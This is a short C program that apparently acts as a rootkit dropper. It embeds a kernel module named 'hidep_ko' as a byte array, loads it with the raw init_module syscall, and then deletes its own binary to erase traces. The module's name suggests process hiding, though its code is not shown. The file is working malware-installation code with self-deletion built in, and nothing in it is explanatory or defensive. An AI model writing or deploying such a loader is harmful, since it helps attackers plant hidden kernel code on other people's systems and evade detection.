#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>

// xxd -i hidep_ko.ko > hidep_ko.h
#include "hidep_ko.h"

int main(int ac, char **argv)
{
    char *mem;

    mem = malloc(hidep_ko_len);
    memcpy(mem, hidep_ko, hidep_ko_len);

    // no glibc wrapper for this.. 
    syscall(SYS_init_module, mem, hidep_ko_len, "");

    free(mem);

    return unlink(argv[0]);
    //return 0;
}
